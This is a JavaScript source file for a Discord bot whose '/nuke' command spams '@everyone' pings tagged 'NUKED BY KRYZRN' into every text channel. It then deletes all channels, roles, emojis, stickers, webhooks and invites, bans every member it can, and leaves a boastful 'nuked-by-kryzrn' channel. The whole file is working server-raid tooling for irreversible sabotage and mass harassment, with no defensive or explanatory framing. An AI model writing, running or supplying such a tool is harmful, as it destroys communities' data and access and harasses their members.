require('dotenv').config();
const {
  Client, GatewayIntentBits, REST, Routes,
  PermissionFlagsBits, ChannelType
} = require('discord.js');

const TOKEN = process.env.DISCORD_TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const GUILD_ID = process.env.GUILD_ID; // optional – for instant commands

if (!TOKEN || !CLIENT_ID) {
  console.error('Missing DISCORD_TOKEN or CLIENT_ID in environment');
  process.exit(1);
}

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

// ---------- Slash Command Registration ----------
const commands = [
  {
    name: 'nuke',
    description: '⚠️ SPAM + DELETE EVERYTHING in this server',
    default_member_permissions: '0' // Admin only
  }
];

const rest = new REST({ version: '10' }).setToken(TOKEN);

(async () => {
  try {
    console.log('Registering slash commands...');
    if (GUILD_ID) {
      await rest.put(Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID), { body: commands });
      console.log(`✅ Guild commands registered for ${GUILD_ID}`);
    } else {
      await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
      console.log('✅ Global commands registered (may take up to 1 hour)');
    }
  } catch (error) {
    console.error('Command registration error:', error);
  }
})();

// ---------- Helper: Delay ----------
const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

// ---------- Spam Function ----------
async function spamAllChannels(guild, spamMessage) {
  const channels = guild.channels.cache.filter(c => c.type === ChannelType.GuildText && c.viewable);
  console.log(`📢 Spamming ${channels.size} text channels...`);

  // Send concurrently with limited parallelism (5 at a time) to be fast but avoid rate limits
  const concurrency = 5;
  const channelArray = [...channels.values()];
  const results = [];

  for (let i = 0; i < channelArray.length; i += concurrency) {
    const batch = channelArray.slice(i, i + concurrency);
    const batchPromises = batch.map(async (channel) => {
      try {
        // Send the message once per channel (you can increase repetitions here)
        await channel.send(spamMessage);
        console.log(`✅ Spammed #${channel.name}`);
        return { channel: channel.name, success: true };
      } catch (err) {
        console.log(`❌ Failed to spam #${channel.name}: ${err.message}`);
        return { channel: channel.name, success: false, error: err.message };
      }
    });
    const batchResults = await Promise.allSettled(batchPromises);
    results.push(...batchResults);
    await delay(500); // brief pause between batches to avoid global rate limit
  }
  console.log(`📢 Spam completed. Success: ${results.filter(r => r.value?.success).length}`);
}

// ---------- Nuke Function (modified to include spam) ----------
async function nukeServer(guild, executor) {
  const logs = [];
  const startTime = Date.now();

  const log = (msg) => {
    console.log(msg);
    logs.push(msg);
  };

  log(`🔥 NUKE INITIATED by ${executor.tag} (${executor.id})`);

  // --- STEP 1: SPAM every text channel before deletion ---
  const spamMsg = "> __NUKED BY KRYZRN__ ||@everyone @here||";
  await spamAllChannels(guild, spamMsg);

  // --- STEP 2: Delete all channels ---
  log('📢 Deleting all channels...');
  const channelDeletePromises = guild.channels.cache.map(async (channel) => {
    try {
      if (channel.deletable) await channel.delete(`Nuked by ${executor.tag}`);
      else log(`⚠️ Cannot delete ${channel.name} (${channel.type})`);
    } catch (err) {
      log(`❌ Failed to delete ${channel.name}: ${err.message}`);
    }
    await delay(300);
  });
  await Promise.allSettled(channelDeletePromises);
  log('✅ All channels deleted.');

  // --- STEP 3: Delete all roles (except @everyone) ---
  log('🎭 Deleting roles...');
  const rolesToDelete = guild.roles.cache.filter(r => r.id !== guild.roles.everyone.id && !r.managed);
  for (const role of rolesToDelete.values()) {
    try {
      if (role.editable) await role.delete(`Nuked by ${executor.tag}`);
    } catch (err) {
      log(`❌ Failed to delete role ${role.name}: ${err.message}`);
    }
    await delay(300);
  }
  log('✅ Roles deleted.');

  // --- STEP 4: Delete emojis & stickers ---
  log('😀 Deleting emojis...');
  for (const emoji of guild.emojis.cache.values()) {
    try { if (emoji.deletable) await emoji.delete(); } catch (err) { log(`Emoji error: ${err.message}`); }
    await delay(300);
  }
  log('📎 Deleting stickers...');
  for (const sticker of guild.stickers.cache.values()) {
    try { if (sticker.deletable) await sticker.delete(); } catch (err) { log(`Sticker error: ${err.message}`); }
    await delay(300);
  }

  // --- STEP 5: Delete webhooks & invites ---
  log('🪝 Deleting webhooks...');
  const webhooks = await guild.fetchWebhooks();
  for (const webhook of webhooks.values()) {
    try { await webhook.delete(); } catch (err) { log(`Webhook error: ${err.message}`); }
    await delay(300);
  }
  log('📨 Deleting invites...');
  const invites = await guild.invites.fetch();
  for (const invite of invites.values()) {
    try { await invite.delete(); } catch (err) { log(`Invite error: ${err.message}`); }
    await delay(300);
  }

  // --- STEP 6: Ban all members (except bot itself) ---
  log('🔨 Banning members...');
  const members = await guild.members.fetch({ force: true });
  let bannedCount = 0;
  for (const member of members.values()) {
    if (member.id === client.user.id) continue;
    if (!member.bannable) {
      log(`⚠️ Cannot ban ${member.user.tag}`);
      continue;
    }
    try {
      await member.ban({ reason: `Nuked by ${executor.tag}` });
      bannedCount++;
    } catch (err) {
      log(`❌ Failed to ban ${member.user.tag}: ${err.message}`);
    }
    await delay(500);
  }
  log(`✅ Banned ${bannedCount} members.`);

  // --- STEP 7: Final log channel (if any channel remains) ---
  const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
  log(`🔥 Nuke completed in ${elapsed}s`);
  try {
    const finalChannel = await guild.channels.create({
      name: 'nuked-by-kryzrn',
      type: ChannelType.GuildText
    });
    await finalChannel.send(`💀 **SERVER NUKED**\nExecuted by: ${executor.tag}\nTime: ${elapsed}s\n\`\`\`${logs.slice(-1800).join('\n')}\`\`\``);
  } catch (err) {
    console.log('Could not create final channel');
  }
}

// ---------- Command Handler ----------
client.on('interactionCreate', async interaction => {
  if (!interaction.isChatInputCommand()) return;
  if (interaction.commandName === 'nuke') {
    if (!interaction.memberPermissions.has(PermissionFlagsBits.Administrator)) {
      return interaction.reply({ content: '❌ Admin only.', ephemeral: true });
    }
    await interaction.reply({ content: '⚠️ **Nuke + Spam initiated!** This is irreversible.', ephemeral: true });
    try {
      await nukeServer(interaction.guild, interaction.user);
    } catch (err) {
      console.error(err);
      await interaction.followUp({ content: `Error: ${err.message}`, ephemeral: true });
    }
  }
});

client.once('ready', () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
});

process.on('unhandledRejection', console.error);
client.login(TOKEN);
